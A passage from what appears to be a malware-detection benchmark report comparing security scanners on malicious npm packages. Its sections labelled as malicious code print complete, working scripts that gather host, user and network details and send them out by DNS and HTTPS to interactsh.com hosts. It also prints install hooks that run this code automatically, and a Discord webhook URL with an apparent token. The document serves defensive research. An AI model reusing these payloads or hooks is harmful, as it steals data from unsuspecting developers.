        const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS"; // Replace with your Discord webhook URL

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at tmp/tmp5riqgego/ssc-ui-static/package/package.json:1
        {"name": "ssc-ui-static", "version": "6.2.4", "description": "", "main": "index.js", "scripts": {"test":
... (truncated)
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/tmp/tmp5riqgego/ssc-ui-static/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000804[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.LongStrings[0m
  Severity: [36mModerate[0m, Confidence: [36mMedium[0m
  Filename: [33m/tmp/tmp5riqgego/ssc-ui-static/package_info-ssc-ui-static-6.2.4.json[0m
   Pattern: [32m["'][a-z0-9]{40,}["'][0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000804[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.LongStrings[0m
  Severity: [36mModerate[0m, Confidence: [36mMedium[0m
  Filename: [33m/tmp/tmp5riqgego/ssc-ui-static/packag
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "ssc-ui-static",
  "version": "6.2.4",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-12T12:27:34.366087"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/ssc-ui-static/6.2.4/extracted_2024-11-21-ssc-ui-static-v6.2.4.tgz/tmp/tmp5riqgego/ssc-ui-static/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/ssc-ui-static/6.2.4/extracted_2024-11-21-ssc-ui-static-v6.2.4.tgz/tmp/tmp5riqgego/ssc-ui-static/package' from local_nodejs...[1m[32mPASS[0m [[34mver 6.2.4[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/ssc-ui-static/6.2.4/tmp/tmp5riqgego/ssc-ui-static/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/ssc-ui-static/6.2.4/tmp/tmp5riqgego/ssc-ui-static/package' from local_nodejs...[1m[32mPASS[0m [[34mver 6.2.4[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking rea
... (truncated)
```

---

## 行为类别：Network Communication

**包名：** `bfx-util-js`  
**版本：** `99.10.9`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `129`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Exfiltrates host/user/package info to remote server via DNS and HTTPS POST requests.

**规避技术：** Data hex-encoded, uses DNS and HTTPS, silent response handling, blends with normal Node.js modules.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

function gethttpips(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}
function getIps(){
str="";
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str=str+toHex(networkInterfaces[item][i].address)+".";
}
}
}
return str.slice(0,-1);
}
function toHex(data){
const bufferText = Buffer.from(data, 'utf8');
const text = bufferText.toString('hex');
return text;
}
function getPathChunks(path){
str="p";
chunks = path.split('/');
for(var i=0;i<chunks.length;i++){
str=str+toHex(chunks[i])+".";
}
str=str.slice(0,-1)+"p";
return str;
}
function toName(pkg){
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+getPathChunks(pkg.c)+"."+toHex(pkg.un)+"."+getIps()+"."+hostname;
if(str.length>255){
substr1 = toHex(pkg.p)+"."+getPathChunks(pkg.c);
substr2 = getIps();
if(substr1.length<150){
substr1 = toHex(pkg.hn)+"."+substr1+"."+toHex(pkg.un);
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else if(substr2.length<150){
substr2 = toHex(pkg.hn)+"."+toHex(pkg.un)+"."+substr2;
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else{
queries.push(toHex(pkg.hn)+"."+substr1+"."+hostname);
queries.push(toHex(pkg.hn)+"."+toHex(pkg.hd)+"."+toHex(pkg.un)+"."+hostname);
queries.push(toHex(pkg.hn)+"."+substr2+"."+hostname);
}
}
else{
queries.push(str);
}
return queries;
}

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, hex_encoding, silent_error_handling, legitimate_api_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `139`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Exfiltrates host/user/package info to remote server via DNS and HTTPS POST.

**规避技术：** Data hex-encoded, uses DNS and HTTPS, blends with normal Node.js modules.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

function gethttpips(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}

function toHex(data){
const bufferText = Buffer.from(data, 'utf8');
const text = bufferText.toString('hex');
return text;
}

function getIps(){
str="";
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str=str+toHex(networkInterfaces[item][i].address)+".";
}
}
}
return str.slice(0,-1);
}

function getPathChunks(path){
str="p";
chunks = path.split('/');
for(var i=0;i<chunks.length;i++){
str=str+toHex(chunks[i])+".";
}
str=str.slice(0,-1)+"p";
return str;
}

function toName(pkg){
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+getPathChunks(pkg.c)+"."+toHex(pkg.un)+"."+getIps()+"."+hostname;
if(str.length>255){
substr1 = toHex(pkg.p)+"."+getPathChunks(pkg.c);
substr2 = getIps();
if(substr1.length<150){
substr1 = toHex(pkg.hn)+"."+substr1+"."+toHex(pkg.un);
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else if(substr2.length<150){
substr2 = toHex(pkg.hn)+"."+toHex(pkg.un)+"."+substr2;
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else{
queries.push(toHex(pkg.hn)+"."+substr1+"."+hostname);
queries.push(toHex(pkg.hn)+"."+toHex(pkg.hd)+"."+toHex(pkg.un)+"."+hostname);
queries.push(toHex(pkg.hn)+"."+substr2+"."+hostname);
}
}
else{
queries.push(str);
}
return queries;
}

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration, dns_exfiltration

**形式化规避：** built_in_module_abuse, hex_encoding, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/package.json`  
**行号：** `8`  
**标注类型：** `npm-install-script`

**行为说明：** Executes index.js automatically before install, enabling arbitrary code execution on package install.

**规避技术：** Abuses npm preinstall script to trigger hidden code before user interaction or review.

**恶意代码：**
```javascript
{
  "name": "bfx-util-js",
  "version": "99.10.9",
  "description": "bitfinex whitehat package",
  "main": "index.js",
  "scripts": {
    "test": "echo \"error no test specified\" && exit 1",
    "preinstall": "node index.js"
  },
  "author": "",
  "License": "ISC"
}
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///package/index.js:96:9:96:20""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///package/index.js:97:9:97:21""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: hostname
[[""SOURCE""|""relative:///package/index.js:98:9:98:21""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///package/index.js:99:25:99:40""]] to [[""SINK""|""relative:///package/index.js:139:11:139:18""]] | Flow Count: 4 | Method Name: getServers","/package/index.js","139","11","139","18"
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/bfx-util-js/99.10.9/bfx-util-js-99.10.9.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:129
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            //process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:139
        req.write(postData);

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:8
        "preinstall":"node index.js"
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m15[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main":"index.js",[0m
[30;1m6 | [0m[35m  "scripts":{[0m
[30;1m7 | [0m[35m  "test":"echo \"error no test specified\" && exit 1",[0m
[30;1m8 | [0m[35m  "preinstall":"node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author":"",[0m
[30;1m11 | [0m[35m  "License":"ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m15[0m[31m ]--[0m
   Rule Id: [34mBD000710[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNSSettings[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32mdns.getServers[0m
[30;1m96 | [0m[35m    hd: os.homedir(
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "bfx-util-js",
  "version": "99.10.9",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 1,
  "is_malicious": true,
  "analysis_date": "2025-07-12T10:19:18.618058"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/bfx-util-js/99.10.9/extracted_bfx-util-js-99.10.9.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/bfx-util-js/99.10.9/extracted_bfx-util-js-99.10.9.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mbitfinex whitehat package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/bfx-util-js/99.10.9/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/bfx-util-js/99.10.9/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mbitfinex whitehat package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[31mR
... (truncated)
```

---

## 行为类别：Obfuscation Techniques

**包名：** `etherscn-api`  
**版本：** `10.3.0`

### 代码上下文

#### 片段 1

**文件：** `tmp/tmpgl1d6swp/etherscn-api/package/package.json`  
**行号：** `7`  
**标注类型：** `npm-install-script`

**行为说明：** Executes hidden script automatically after install, enabling arbitrary code execution.

**规避技术：** Uses postinstall script in package.json to trigger hidden file execution, blending with normal npm workflow.

**恶意代码：**
```javascript
"scripts": {
    "postinstall": "node 2937h0pg.cjs"
  },
```

**形式化行为：** arbitrary_command_execution, persistence_installation

**形式化规避：** postinstall_hook_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

```
# 批量混淆技术查询结果
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:3929:1:4672""]] to [[""SINK""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:1408:1:1422""]] | PARSE: 10","/tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs","1","1408","1","1422"
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:3929:1:4672""]] to [[""SINK""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:1488:1:1502""]] | PARSE: 10","/tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs","1","1488","1","1502"
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:3929:1:4672""]] to [[""SINK""|""relative:///tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1:1559:1:1573""]] | PARSE: 10","/tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs","1","1559","1","1573"
"array-parse","Obfuscation","error","[[
... (truncated)
```

#### GUARDDOG

```
Found 2 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/etherscn-api/10.3.0/2024-10-31-etherscn-api-v10.3.0.tgz

npm-obfuscation: found 1 source code matches
  * This package is using a common obfuscation method often used by malware at tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs:1
        const _0x1b0aff=_0x3fa6;function _0x3fa6(_0x53c87a,_0x4bb7ff){const _0x17c848=_0x17c8();return _0x3fa6=function(_0x3fa6dc,_0x16d2b9){_0x3fa6dc=_0x3fa6dc-0xb3;let _0x77a1c3=_0x17c848[_0x3fa6dc];return _0x77a1c3;},_0x3fa6(_0x53c87a,_0x4bb7ff)...llation();

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at tmp/tmpgl1d6swp/etherscn-api/package/package.json:7
        "postinstall": "node 2937h0pg.cjs"
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m6[0m[31m ]--[0m
   Rule Id: [34mBD000804[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.LongStrings[0m
  Severity: [36mModerate[0m, Confidence: [36mMedium[0m
  Filename: [33m/tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs[0m
   Pattern: [32m["'][a-z0-9]{40,}["'][0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m6[0m[31m ]--[0m
   Rule Id: [34mBD000804[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.LongStrings[0m
  Severity: [36mModerate[0m, Confidence: [36mMedium[0m
  Filename: [33m/tmp/tmpgl1d6swp/etherscn-api/package/2937h0pg.cjs[0m
   Pattern: [32m["'][a-z0-9]{40,}["'][0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m6[0m[31m ]--[0m
   Rule Id: [34mBD000804[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.LongStrings[0m
  Severity: [36mModerate[0m, Confidence: [36mMedium[0m
  Filename: [33m/tmp/tmpgl1d6swp/etherscn-api/package_info-etherscn-api-10.3.0.json
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "etherscn-api",
  "version": "10.3.0",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T10:43:39.053422"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/etherscn-api/10.3.0/extracted_2024-10-31-etherscn-api-v10.3.0.tgz/tmp/tmpgl1d6swp/etherscn-api/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/etherscn-api/10.3.0/extracted_2024-10-31-etherscn-api-v10.3.0.tgz/tmp/tmpgl1d6swp/etherscn-api/package' from local_nodejs...[1m[32mPASS[0m [[34mver 10.3.0[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mAPI to etherscan with a simple interface[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/etherscn-api/10.3.0/tmp/tmpgl1d6swp/etherscn-api/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/etherscn-api/10.3.0/tmp/tmpgl1d6swp/etherscn-api/package' from local_nodejs...[1m[32mPASS[0m [[34mver 10.3.0[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mAPI to etherscan with a simple interface[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [
... (truncated)
```

---

## 行为类别：Persistence Mechanisms

**包名：** `bfx-util-js`  
**版本：** `99.10.10`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `129`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system/user/package data and exfiltrates it via HTTPS POST to remote server.

**规避技术：** Uses legitimate modules, silent DNS queries, and no output to avoid detection.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

// ... helper functions omitted for brevity ...

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
    //dirs: JSON.stringify(getFiles(["C:\\","D:\\","C:\\Users\\"])),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
  dns.lookup(qs[j], function(err, result) {
    //console.log(result)
  });
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `139`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system/user data and exfiltrates via DNS and HTTPS POST to remote server.

**规避技术：** Uses DNS queries and HTTPS POST, blends with normal network activity, no output or error logging.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

function getFiles(paths) {
var ufiles=[];
for(var j=0;j<paths.length;j++){
  mpath = paths[j];
  files = fs.readdirSync(mpath);
  for(var i=0;i<files.length;i++){
  ufiles.push(path.join(mpath,files[i]));
  }
}
  return ufiles;
}

function toHex(data){
const bufferText = Buffer.from(data, 'utf8');
const text = bufferText.toString('hex');
return text;
}
function gethttpips(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}
function getIps(){
str="";
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str=str+toHex(networkInterfaces[item][i].address)+".";
}
}
}
return str.slice(0,-1);
}
function getPathChunks(path){
str="p";
chunks = path.split('/');
for(var i=0;i<chunks.length;i++){
str=str+toHex(chunks[i])+".";
}
str=str.slice(0,-1)+"p";
return str;
}
function toName(pkg){
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+getPathChunks(pkg.c)+"."+toHex(pkg.un)+"."+getIps()+"."+hostname;
if(str.length>255){
substr1 = toHex(pkg.p)+"."+getPathChunks(pkg.c);
substr2 = getIps();
if(substr1.length<150){
substr1 = toHex(pkg.hn)+"."+substr1+"."+toHex(pkg.un);
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else if(substr2.length<150){
substr2 = toHex(pkg.hn)+"."+toHex(pkg.un)+"."+substr2;
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else{
queries.push(toHex(pkg.hn)+"."+substr1+"."+hostname);
queries.push(toHex(pkg.hn)+"."+toHex(pkg.hd)+"."+toHex(pkg.un)+"."+hostname);
queries.push(toHex(pkg.hn)+"."+substr2+"."+hostname);
}
}
else{
queries.push(str);
}
//console.log(str.length);
return queries;
}

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
    //dirs: JSON.stringify(getFiles(["C:\\","D:\\","C:\\Users\\"])),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, hex_encoding, silent_error_handling, legitimate_api_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/package.json`  
**行号：** `8`  
